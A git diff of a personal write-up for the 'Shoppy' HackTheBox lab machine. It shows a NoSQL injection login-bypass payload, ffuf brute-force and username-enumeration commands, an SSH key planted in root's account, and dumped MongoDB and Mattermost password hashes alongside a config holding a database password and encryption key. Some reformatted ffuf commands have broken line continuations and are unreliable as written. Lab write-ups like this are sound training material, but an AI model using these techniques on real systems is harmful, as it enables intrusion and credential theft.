@@ -175,8 +175,7 @@ admin'||''==='
 ```
 the above implies that we already know for sure that the admin user is valid,  
 not sure how we'd know that, outside of a few redirects from the gobuster outputs  
-also we've seen a mysql account from the smtp server,  
-but I personally haven't seen anything that would have made me think that this login page is powered by a no-sql db.  
+I personally haven't seen anything that would have made me think that this login page is powered by a no-sql db.  
 So I tried a bunch of no-sql tools to try and see if I could find some more info, but this was unsuccessfull:  
 [https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)    
 [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)  
@@ -186,11 +185,23 @@ I guess I'll have to wait for the box to retire and have ippsec explain that my 
 The closest I could get to a way of finding this was some login bypass bruteforcing with ffuf:  
 But I still would have needed to have the above expression in a wordlist  
 ```bash
-ffuf -w nosql.txt -u http://shoppy.htb/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=FUZZ&password=FUZZ' -fr "WrongCredentials"
+ffuf \
+  -w nosql.txt \
+  -u http://shoppy.htb/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \ 
+  -d 'username=FUZZ&password=FUZZ' 
+  -fr "WrongCredentials"
 ```
 expanding on the idea above to get other potential usernames  
 ```bash
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://shoppy.htb/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ'||''==='&password=asdf" -fr "WrongCredentials"
+ffuf 
+  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -u http://shoppy.htb/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=FUZZ'||''==='&password=asdf" \
+  -fr "WrongCredentials"
 ```
 we get josh  
 
@@ -309,8 +320,16 @@ mounting the filesystem in an alpine container works
 ```bash
 /mnt/root # wc -c root.txt
 33 root.txt
-
 ```
+I've seen a postgres db earlier, and I'd like to know what it was for  
+And I'd also like to understand the golang nonsense
+So I'm dropping an authorized key in root real quick to try to understand 
+```bash
+/mnt/root/.ssh # vi authorized_keys
+/mnt/root/.ssh # chmod 400 authorized_keys
+```
+earlyer I found:
+```bash
 ./ShoppyApp/node_modules/@pm2/io/docker-compose.yml:  postgres:
 ./ShoppyApp/node_modules/@pm2/io/docker-compose.yml:    image: postgres:11
 ./ShoppyApp/node_modules/@pm2/io/docker-compose.yml:      POSTGRES_DB: 'test'
@@ -320,4 +339,79 @@ mounting the filesystem in an alpine container works
 ./ShoppyApp/node_modules/@pm2/io/.drone.jsonnet:          POSTGRES_DB: "test",
 ./ShoppyApp/node_modules/@pm2/io/.drone.jsonnet:          POSTGRES_PASSWORD: "password"
 ./ShoppyApp/node_modules/@pm2/io/test.sh:    export OPENCENSUS_PG_HOST="postgres"
+```
+```bash
+root@shoppy:~# netstat -tulpen
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          15231      762/sshd: /usr/sbin
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      119        17427      855/postgres
+tcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN      998        20710      997/mattermost
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      118        17496      840/mongod
+```
+```bash
+root@shoppy:/home/deploy# grep sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+jaeger:x:1000:1000:jaeger,,,:/home/jaeger:/bin/bash
+deploy:x:1001:1001::/home/deploy:/bin/sh
+postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mattermost:x:998:997::/home/mattermost:/bin/sh
+```
+The MongoDB is the one that we accessed from the webapp and got josh credentials from 
+```bash
+> show dbs
+admin   0.000GB
+config  0.000GB
+local   0.000GB
+shoppy  0.000GB
+> use shoppy
+switched to db shoppy
+> show collections
+products
+sessions
+users
+> show users
+> db.users.find()
+{ "_id" : ObjectId("62db0e93d6d6a999a66ee67a"), "username" : "admin", "password" : "23c6877d9e2b564ef8b32c3a23de27b2" }
+{ "_id" : ObjectId("62db0e93d6d6a999a66ee67b"), "username" : "josh", "password" : "6ebcea65320589ca4f2f1ce039975995" }
+```
+```bash
+root@shoppy:/home/jaeger/ShoppyApp# psql -U postgres -d test -W
+Password:
+psql: error: FATAL:  Peer authentication failed for user "postgres"
+```
+so the reference I found earlyer are some possible defaults for the shoppy thing  
+mattermost is what actually uses the postgress instance  
+```json
+    "SqlSettings": {
+        "DriverName": "postgres",
+        "DataSource": "postgres://mmuser:mmuser-password@localhost/mattermost?sslmode=disable\u0026connect_timeout=10\u0026binary_parameters=yes",
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "ConnMaxIdleTimeMilliseconds": 300000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "oha9g795it4bxnngdnokt7kwdhjbpyxn",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false,
+        "MigrationsStatementTimeoutSeconds": 100000,
+        "ReplicaLagSettings": []
+    },
+ 
+```
+```sql
+mattermost=> select username,password,email,position from users;
+   username    |                           password                           |          email          |       position
+---------------+--------------------------------------------------------------+-------------------------+----------------------
+ channelexport |                                                              | channelexport@localhost |
+ feedbackbot   |                                                              | feedbackbot@localhost   |
+ appsbot       |                                                              | appsbot@localhost       |
+ playbooks     |                                                              | playbooks@localhost     |
+ boards        |                                                              | boards@localhost        |
+ jess          | $2a$10$KCB8RgS4vGCOi5U30TIVo.xuW/jf65Z1a3ekuAcyUMfEvteo7CdGe | jess@shoppy.htb         | HR
+ jaeger        | $2a$10$2jMBLobJ4yOTWBtsBff.Pem7/olIIoHFkQCbAsqlPFDfXWzx5JcJ. | jaeger@shoppy.htb       | CEO
+ josh          | $2a$10$jcaXTs90C0vdQHI70yNnieFSsV7QLiinC5xzmLvwDaHIAqeWitz2W | josh@shoppy.htb         | Full Stack Developer
+(8 rows)
 ```
